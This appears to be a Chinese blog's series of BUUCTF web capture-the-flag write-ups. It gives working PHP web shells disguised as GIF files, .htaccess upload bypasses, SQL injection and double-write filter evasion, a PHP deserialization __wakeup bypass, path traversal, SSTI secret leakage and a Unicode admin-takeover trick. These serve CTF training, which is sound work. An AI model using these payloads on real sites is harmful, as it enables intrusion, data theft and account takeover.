的使用 经过尝试：修改 Content-Type 类型、后缀、内容、图片马都不可成功上传，使用之前的 GIF文件头修改 也不可，当过滤到如此地步时，就应该想到 .htaccess 和 .user.ini 文件了。 尝试 .user.ini ，没有上传成功 尝试 .htaccess ，成功上传，得到路径 紧接着上传 ma.png ，文件内容是 &lt;?php @eval($_REQUEST[&#39;aaa&#39;]); ?&gt; 蚁剑连接即可 注意：这道题经过尝试发现，可以上传 .png 格式的文件，不能上传 .gif 格式的文件 十一、[MRCTF2020]Ez_bypass1考点：md5 碰撞、PHP 弱类型 12345678910111213141516171819202122232425262728293031323334353637383940I put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125;Please input first 分析： 1234567if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) #无法使用 md5碰撞，可数组法绕过if (!is_numeric($passwd)) &#123; if($passwd==1234567)&#125;#使用 php弱类型 绕过 payload： 1234?id[]=QNKCDZO&amp;gg[]=s155964671a 或 ?id[]=a&amp;gg[]=s #只要两者不同即可#post 传参： passwd=1234567asd 十二、[GYCTF2020]Blacklist1考点：SQL 注入 数字型注入，有报错 1return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject); 11&#x27; order by 2# #两列 堆叠注入： 11&#x27;;show databases;# 11&#x27;;show tables;# 11&#x27;;show columns from FlagHere;# 11&#x27;;show columns from words;# 与之前的一关相同，我们现在所提交的查询是针对表 words 的，我们需要查到表 FlagHere 中的内容。 由过滤的情况可以看到，之前的方法：使用 rename 或 alter 修改表名的方法行不通了。 使用 handler 查询： 11&#x27;;handler FlagHere open;handler FlagHere read first;# 12.1 总结：Mysql 查询语句 之 Handler官方文档 mysql除可使用select查询表中的数据，也可使用handler语句，它每次只能查询1条记录，而 select 可以根据需要返回多条查询结果。因此 handler语 句并不具备 select 语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。 可以降低优化器对于SQL语句的解析与优化开销，从而提升查询性能。 测试： 1234567891011create database practice;use practice;create table handler_table(id int,username varchar(10));desc handler_table;insert into handler_table values(1,&#x27;李华&#x27;);insert into handler_table values(2,&#x27;小马&#x27;);insert into handler_table values(3,&#x27;张鑫&#x27;);insert into handler_table values(4,&#x27;周明&#x27;);insert into handler_table values(5,&#x27;蔡紫&#x27;);select * from handler_tables; 不通过索引查表： 12345678910#打开句柄handler handler_table open;#查询数据handler handler_table read first;handler handler_table read next;handler handler_table read next;handler handler_table read next;handler handler_table read next;#关闭句柄handler handler_table close; 12345mysql&gt; handler handler_table close;Query OK, 0 rows affected (0.00 sec)mysql&gt; handler handler_table read next;ERROR 1109 (42S02): Unknown table &#x27;handler_table&#x27; in HANDLER 通过索引查表：需要创建索引 1234567891011#以 handler_table 中的 id 字段创建索引，命名为 handler_indexcreate index handler_index on handler_table(id);#打开句柄，命名为 phandler handler_table open as p;#查看数据handler p read handler_index first;#第一行handler p read handler_index next;#下一行handler p read handler_index prev;#上一行handler p read handler_index last;#最后一行#关闭句柄handler p close; 123456789101112#以 handler_table 中的 id 字段创建索引，命名为 handler_indexcreate index handler_index on handler_table(id);#打开句柄handler handler_table open;#查看特定位置的数据handler p handler_table read handler_index=(3);handler handler_table read handler_index first;#查第一条handler handler_table read handler_index next;#查下一条handler handler_table read handler_index prev;#查上一条handler handler_table read handler_index last;#查最后一条#关闭句柄handler handler_table close; 12#删除索引drop index handler_index on handler_table; Handler 与 select 的比较： select语句一次返回所有相关行，handler每次返回一行 HANDLER涉及的分析较少，比SELECT更快 没有优化程序或查询校验开销 在两个管理程序请求之间，不需要锁定表。 参考","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/tags/BUUCTF/"}],"author":"xizhi-future"},{"title":"BUUCTF-WEB(二)","slug":"BUUCTF-WEB（二）","date":"2021-06-04T10:22:55.000Z","updated":"2021-07-09T07:18:43.975Z","comments":true,"path":"2021/06/04/BUUCTF-WEB（二）/","link":"","permalink":"https://xizhi-future.github.io/2021/06/04/BUUCTF-WEB%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"概述：BUUCTF-WEB 十~二十道题目，难度较前十道略有提升，内容有：文件上传、HTTP 头部、SSTI、PHP字符串特性、序列化与反序列化、SQL注入、网站的备份文件。","text":"概述：BUUCTF-WEB 十~二十道题目，难度较前十道略有提升，内容有：文件上传、HTTP 头部、SSTI、PHP字符串特性、序列化与反序列化、SQL注入、网站的备份文件。 一、[极客大挑战 2019]Knife1考点：连 shell 工具：菜刀、蚁剑 根据界面的提示，直接上菜刀或者是蚁剑，根目录下得到 flag 二、[极客大挑战 2019]Http1考点：HTTP header：Referer、User-Agent、X-Forwarded-For 抓包查看 发现 Secret.php，访问发现 12#It doesn&#x27;t come from &#x27;https://www.Sycsecret.com&#x27;添加 Referer: https://www.Sycsecret.com 12#Please use &quot;Syclover&quot; browser修改 User-Agent: Syclover 12#No!!! you can only read this locally!!!添加 X-Forwarded-For: 127.0.0.1 得到 flag 总结： 1234567891011#HTTP headerReferer： 当浏览器向Web服务器发送请求时，在 HTTP header 带上中带上 Referer 字段，用来告诉浏览器网页是从哪个页面链接过来的。常用在防盗链和防恶意请求中。User-Agent： 用于传输用户使用的是什么浏览器。有些网站为了防止爬虫，会检验User-Agent，只有当是用户访问的时候才会传输数据。X-Forwarded-For： 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段，即用来表示HTTP请求端的真实IP。 理解：当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。如果没有 XFF，所有通过代理服务器的连接只会显示代理服务器的IP地址，而不会显示发起请求的原始IP地址，而如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。 所以如果我们使用透明代理去上网，那么在透明代理发送给服务器端的HTTP请求中会包含x-forward-for信息，用来传输最原始的IP地址。 三、[护网2018]easy_tornado1考点：ssti 查看三个文件内容 12345678/flag.txtflag in /fllllllllllllag/welcome.txtrender #提示：SSTI 渲染/hints.txtmd5(cookie_secret+md5(filename)) #我们需要找到 cookie_secret 抓包查看： 查看每个文件时，GET将会传入两参数：filename 和 filehash ，然后回显给我们文件内容。 发现：当传入的参数值错误时，将自动跳转转到 /error?msg=Error 页面，并且含参 ?msg= ，尝试 ?msg=&#123;&#123;3&#125;&#125;，可以回显，紧接着 ?msg=&#123;&#123;3*7&#125;&#125; ，返回 显然：被过滤掉了 从题目得知：Tornado 是一种 Web 服务器软件的开源版本。Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。 搜索 Tornado 框架的配置文件：handler.settings https://tornado-zh.readthedocs.io/zh/latest/web.html 1?msg=&#123;&#123;handler_settings&#125;&#125; # cookie_secret:72a8e052-2f41-47ce-92b6-63610540b665 123456&lt;?php$a = md5(&quot;/fllllllllllllag&quot;);echo md5(&quot;72a8e052-2f41-47ce-92b6-63610540b665&quot;.$a);?&gt;#传入#?filename=/fllllllllllllag&amp;filehash=d7965e5b71144dc21155aa80d0bd721f 四、[RoarCTF 2019]Easy Calc1考点：PHP 的字符串解析特性 查看源码，发现 1234567891011121314151617&lt;script&gt; $(&#x27;#calc&#x27;).submit(function()&#123; $.ajax(&#123; url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), type:&#x27;GET&#x27;, success:function(data)&#123; $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt; &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125; &lt;/div&gt;`); &#125;, error:function()&#123; alert(&quot;这啥?算不来!&quot;); &#125; &#125;) return false; &#125;)&lt;/script&gt; 访问 calc.php ，得到 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 不允许我们传入字母，我们可以传入 ? num= ，来绕过。过程是：WAF检测时检测不到 &quot;num&quot; ，这个变量，因为只存在 &quot; num&quot; ，这样就饶过了WAF判断；随后PHP在解析的时候会将这个空格去掉，从而使我们的代码在包含非法字符的情况下还能正常运行。 1?%20num=qqq 思路：绕过 WAF，危险函数传参 注：由于 / 被过滤掉了，我们可以使用 ascii 编码函数 chr() 1/calc.php? num=var_dump(scandir(chr(47))) 1/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) 得到 flag 4.1 总结：PHP 字符串解析特性 概述：PHP 在用 GET、POST等传入参数（即传入所要查询的字符串）时，会将其转换为内部关联的 $_GET 和 $_POST 。比如：我们传入 /?path=flag ，将会变为 Array([path] =&gt; &quot;flag&quot;) 。 特性：查询字符串在解析的过程中会将某些字符删除或者是用下环线来代替。比如：我们传入 /?%20msg[id%00=10 ，它仍将会被解析成 Array([msg_id] =&gt; 10) 。 利用：当我们遇到传入的参数只允许是数字时，我们可以通过传入 /?%20msg[id%00=10 来进行绕过WAF。 PHP 会将所有参数转换成为有效的变量名，有以下两种方式： 删除空白字符：%20 %00 将变为空 将某些字符转换成为下划线：+ [ ] 等将变为 _ 测试： 1parse_str() 函数把查询字符串解析到变量中。 12345#测试代码&lt;?phpparse_str(&quot;msg_id=10&quot;,$a);print_r($a);?&gt; 常见利用： 1scandir() 函数返回指定目录中的文件和目录的数组。 五、[极客大挑战 2019]PHP1考点：网站备份文件、序列化与反序列化 根据题目的提示：有良好的备份王真的习惯。发现网站的备份文件：www.zip 1234#flag.php 文件&lt;?php $flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;?&gt; 123456789101112131415161718192021222324252627282930313233343536#class.php文件：存在一些魔术方法，涉及到序列化与反序列化漏洞&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; //注意是私有按量 private $password = &#x27;yesyes&#x27;; //注意是私有按量 public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; #创建对象之后被调用 &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; #反序列化时被触发 &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125; #对象被销毁时被触发&#125;?&gt; 123456#index.php文件&lt;?php include &#x27;class.php&#x27;; //调用 class.php $select = $_GET[&#x27;select&#x27;]; $res=unserialize(@$select); //对输入进行反序列化?&gt; 可以发现，当index.php文件中对输入内容进行反序列化时，将会调用魔术方法 __wakeup()，从而将 username 的值进行覆盖为 guest 。而 __destruct() 中明显知道只有 username=admin 时，才会显示 flag。因此我们必须绕过 __wakeup()。 构造： 12#构造?select=O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 另外，为了防止我们在传入 select 之后，在 index.php 文件中对其进行反序列化时调用 __wakeup()，我们需要利用一个特性，即 在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行 。 因此最终的 payload 如下：改为大于2即可 1?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 5.1 总结：序列化 Private 所声明的私有变量 只能在所声明的类中可见，在该类的子类以及该类的对象中均不可见。所以私有变量在序列化时，类名和字段名前面都会加上 %00 ，即 ascii 为0的字符（不可见字符）； Protected 所声明受保护类型的变量 序列化时会有 %00*%00 字符； 测试一： 12345678910&lt;?phpclass FileHandler &#123; public $op=&#x27;2&#x27;; public $filename=&#x27;flag.php&#x27;; public $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#返回O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:1:&quot;2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; 测试二： 12345678910&lt;?phpclass FileHandler &#123; private $op=&#x27;2&#x27;; private $filename=&#x27;flag.php&#x27;; private $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#返回O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;FileHandlerop&quot;;s:1:&quot;2&quot;;s:21:&quot;FileHandlerfilename&quot;;s:8:&quot;flag.php&quot;;s:20:&quot;FileHandlercontent&quot;;N;&#125; 12#实际上是O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;%00FileHandler%00op&quot;;s:1:&quot;2&quot;;s:21:&quot;%00FileHandler%00filename&quot;;s:8:&quot;flag.php&quot;;s:20:&quot;%00FileHandler%00content&quot;;N;&#125; 测试三： 12345678910&lt;?phpclass FileHandler &#123; protected $op=&#x27;2&#x27;; protected $filename=&#x27;flag.php&#x27;; protected $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#返回O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:1:&quot;2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125; 12#实际上是O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;s:1:&quot;2&quot;;s:11:&quot;%00*%00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;%00*%00content&quot;;N;&#125; 六、[极客大挑战 2019]Upload1考点：文件上传，过 &lt;? 直接 1.php 尝试 紧接着常规操作，修改 Content-Type 尝试其它后缀类型，发现 .php3 .php2 .php5 均不行，而 .phtml 可以 不能含有 &lt;? ，那么就得使用其它形式 123# hack_GIF_ma.phtmlGIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#x27;111&#x27;])&lt;/script&gt; 接下来就是获取图片上传的路径 最后蚁剑连接即可 6.1 PHP 一句话木马变形过 &lt;?： 123//.gifGIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#x27;cmd&#x27;])&lt;/script&gt; 常用： 123//.gifGIF89a&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;); ?&gt; 七、[ACTF2020 新生赛]Upload1考点：文件上传，前后端绕过 直接 1.php 尝试 审查元素，前端存在过滤 删除该代码，再次上传，虽然没有出现提示框，但仍旧没有成功上传 我们使用 123# hack_GIF_ma.phtmlGIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#x27;111&#x27;])&lt;/script&gt; 成功上传，然后蚁剑连接即可，该题也可上传 .php2 八、[极客大挑战2019]BabySQL1考点：SQL注入之 or、and、from、select等的过滤 1q&#x27;# #单引号闭合 经过测试，or and union select 1234567891011121314151617#联合查询 双写绕过 有回显#过滤了 from where or select andq&#x27; UnUNIONIOn SeSelectLect 1,2,3##得到数据库 geek-q&#x27; UnUNIONIOn SeSelectLect 1,database(),3##得到表b4bsql,geekuser-q&#x27; UnUNIONIOn SeSelectLect 1,(selselectect group_concat(table_name) frfromom infoORrmation_schema.tables whwhereere table_schema=database()),3# #得到列id,username,password-q&#x27; UnUNIONIOn SeSelectLect 1,(selselectect group_concat(column_name) frfromom infoORrmation_schema.columns whwhereere table_schema=database() aandnd table_name=0x62346273716c),3# #得到flag-q&#x27; UnUNIONIOn SeSelectLect 1,(selselectect group_concat(concat_ws(&#x27;~&#x27;,username,passwOorRd)) frfromom geek.b4bsql),3# 九、[ACTF2020 新生赛]BackupFile1考点：备份文件泄露、PHP弱类型 diesearch 扫 根据提示应该是.bak之类的 尝试之后，/index.php.bak 成功下载，查看其中内容 12345678910111213141516&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; 简单的 php弱类型比较 12#构造?key=123 获取到 flag 9.1 总结dirsearch 工具： https://github.com/maurosoria/dirsearch 123456# kali 下载git clone https://github.com/maurosoria/dirsearchcd dirsearch/#使用./dirsearch.py -u 目标网址 -e * # *代表所有类型的脚本./dirsearch.py -u http://df0ee6df-14b2-4f2b-a5f3-2581279eee8d.node3.buuoj.cn/ -e * 常见的备份文件后缀：.git .svn .swp .~ .bak .bash_history.zip.tar.gz.rar.7z https://www.anquanke.com/post/id/164086#h3-13) 十、[HCTF 2018]admin1考点： 注册一个用户，查看各个页面的源码，发现 下载 flask 模板源码 一一查看代码，找有用的信息 index.html 需要我们的 session 是 admin 的 routes.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#!/usr/bin/env python# -*- coding:utf-8 -*-from flask import Flask, render_template, url_for, flash, request, redirect, session, make_responsefrom flask_login import logout_user, LoginManager, current_user, login_userfrom app import app, dbfrom config import Configfrom app.models import Userfrom forms import RegisterForm, LoginForm, NewpasswordFormfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprepfrom io import BytesIOfrom code import get_verify_code@app.route(&#x27;/code&#x27;)def get_code(): image, code = get_verify_code() # 图片以二进制形式写入 buf = BytesIO() image.save(buf, &#x27;jpeg&#x27;) buf_str = buf.getvalue() # 把buf_str作为response返回前端，并设置首部字段 response = make_response(buf_str) response.headers[&#x27;Content-Type&#x27;] = &#x27;image/gif&#x27; # 将验证码字符串储存在session中 session[&#x27;image&#x27;] = code return response@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def index(): return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def register(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = RegisterForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower(): flash(&#x27;Wrong verify code.&#x27;) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form) if User.query.filter_by(username = name).first(): flash(&#x27;The username has been registered&#x27;) return redirect(url_for(&#x27;register&#x27;)) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash(&#x27;register successful&#x27;) return redirect(url_for(&#x27;login&#x27;)) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form)@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash(&#x27;Invalid username or password&#x27;) return redirect(url_for(&#x27;login&#x27;)) login_user(user, remember=form.remember_me.data) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/logout&#x27;)def logout(): logout_user() return redirect(&#x27;/index&#x27;)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form)@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def edit(): if request.method == &#x27;POST&#x27;: flash(&#x27;post successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;edit.html&#x27;, title = &#x27;edit&#x27;)@app.errorhandler(404)def page_not_found(error): title = unicode(error) message = error.description return render_template(&#x27;errors.html&#x27;, title=title, message=message)def strlower(username): username = nodeprep.prepare(username) return username 10.1 法一：session 欺骗​ 利用 Flask 是一种不包含数据库操作的框架，只能将 session 储存在 cookie 当中。 ​ 这里使用第二种方法，下面介绍。 参考： Flask session 安全性问题 https://www.jianshu.com/p/f92311564ad0 10.2 Unicode 欺骗​ 看上面的路由代码，每当用户输入用户名的时候，都会进行 将 name 转换为小写 的操作，而装欢的函数并不是 PHP自带的函数 lower ，在代码最后发现，使用的是自己定义的一个函数 strlower 。 ​ 该函数定义的方法是使用了 nodeprep.prepare ，而 from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep ，可以看到该函数是从 twisted 中导入的。从所给的 requirements.txt 文件文件中看到， 该 Twisted 版本是 10.2.0 ，而上网查到，与官网的最新版本差距很大，从而猜测会存在漏洞。 一些关于 Unicode 的安全性问题博客，参考链接： https://www.dazhuanlan.com/2019/12/09/5dedf52936197/ https://xz.aliyun.com/t/5402 https://gality.cn/?p=123 https://blog.lyle.ac.cn/2018/12/08/idnfuzz/ https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/ 原理就是如果我们注册一个 ᴬdmin 的用户，注册时经过nodeprep.prepare 转化将会变为 Admin ，而如果 Admin 再次调用一次 nodeprep.prepare ，又会把 A 变成 a 。所以如果我们 注册一个 ᴬdmin ，然后修改密码该用户的密码，就相当于修改的是 admin 的密码，从而达到最终越权的目的。 解题： 注册 ᴬdmin 用户并登陆进去，可以看到相当于登陆的是 Admin 用户 修改 ᴬdmin 用户的密码为 123456 使用 admin 用户，密码为 123456 登录，得到 flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/tags/BUUCTF/"}],"author":"xizhi-future"},{"title":"BUUCTF-Web(一)","slug":"BUUCTF-WEB（一）","date":"2021-05-26T11:18:25.000Z","updated":"2021-07-09T07:18:38.158Z","comments":true,"path":"2021/05/26/BUUCTF-WEB（一）/","link":"","permalink":"https://xizhi-future.github.io/2021/05/26/BUUCTF-WEB%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"概述：BUUCTF-WEB 前十道题目，比较基础，主要考察文件包含、SQL注入、命令执行、源码泄露。","text":"概述：BUUCTF-WEB 前十道题目，比较基础，主要考察文件包含、SQL注入、命令执行、源码泄露。 一、[HCTF 2018]WarmUp考点：文件包含、代码审计 Ctrl + U 查看源码 访问得到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); //url解密 $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) //检查变量是否是字符串，是返回 true ，否返回 false &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 将获取到的file变量内容进行两次问号过滤，每一次只截取到第一个问号的前面部分内容，我们要想每次截到的部分都符合白名单，即 source.php 或者是 hint.php。 测试 1http://fde198a0-d059-40ed-bdbd-3812ba8e8ad3.node3.buuoj.cn/source.php?file=hint.php 得到 flag not here, and flag in ffffllllaaaagggg，由于GET传参将会自动对特殊字符进行url编码，则利用 urldecode()函数 构造如下 123456789source.php/?file=hint.php%253f/../../../../ffffllllaaaaggggsource.php/?file=source.php%253f/../../../../ffffllllaaaaggggsource.php/?file=source.php%253f/../../../../../ffffllllaaaagggg#问号进行 两次url编码 之后为 % ，GET传参首先自动解码为 %3f(是?进行一次url编码的结果)，其中没有?，原样返回，绕过第一次过滤，然后 urldecode() 函数再次url解码得到问号，第二次问号过滤截取到结果 source.php 符合条件。source.php/?file=hint.php?/../../../../../ffffllllaaaaggggsource.php/?file=source.php?/../../../../../ffffllllaaaaggggsource.php/?file=source.php?/../../../../../../ffffllllaaaagggg#经过GET传参之后变成 =source.php%3f..%2f..%2f..%2f..%2f..%2fffffllllaaaagggg，其中没有?，原样返回，绕过第一次过滤，然后 urldecode() 函数解码回到 =source.php?../../../../../ffffllllaaaagggg，第二次问号过滤截取到结果 source.php 符合条件。 总结 : 1234#总结函数 mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr() is_string() 检查变量是否是字符串，是返回 true ，否返回 false mb_strpos (haystack ,needle) 返回要查找的字符串（haystack）在别一个字符串（needle）中首次出现的位置，如没有则返回原字符串 二、[极客大挑战 2019]EasySQL1考点：SQL注入 之 万能密码 ‘ or 1=1 12#我们使用 &#x27;) 判断闭合方式q&#x27;) 单引号闭合 12#万能密码尝试&#x27; or 1=1# 三、[极客大挑战 2019]Havefun1考点：源码泄露 Ctrl + U 查看源代码发现 则我们访问 ?cat=dog ，得到 四、[强网杯 2019]随便注1考点：SQL注入 之 堆叠查询 技能：mysql 表结构的更改语句 12341&#x27; #得到报错，单引号闭合1&#x27; or 1=1# #万能密码尝试1&#x27; order by 2 #两列1&#x27; union select 1,2# 返回 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 堆叠查询： 11&#x27;;show databases;# 11&#x27;;show tables;# 11&#x27;;desc `1919810931114514`;# #查表的结构 存在 flag 字段 11&#x27;;desc words;# 注：windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符，引用数字名称时，需要反引号包裹，字母型可不用包裹。 分析： 我们提交查询的内容应该就是该表（words）中的数据，而SQL语句应该类似于 selsect id,data from words where id = ；而前面已经发现，flag 存在另一张表（1919810931114514）中。 方法一：更改 words 表名 为 其它，1919810931114514 表名为 words；flag 字段名为 id。这样查询的即是 1919810931114514 中的 flag字段了。 11&#x27;;rename table `words` to `others`;rename table `1919810931114514` to `words`;alter table words change column flag id varchar(100);show tables;desc words;# 可以看到表的结构已经成功被我们更改，最后，只需要直接使用万能密码即可 11&#x27; or 1=1# 补充： 120&#x27;;show columns from words;#0&#x27;;show columns from `1919810931114514`;# 总结：mysql 对 表的结构的更改语句 12345678910111213141516# 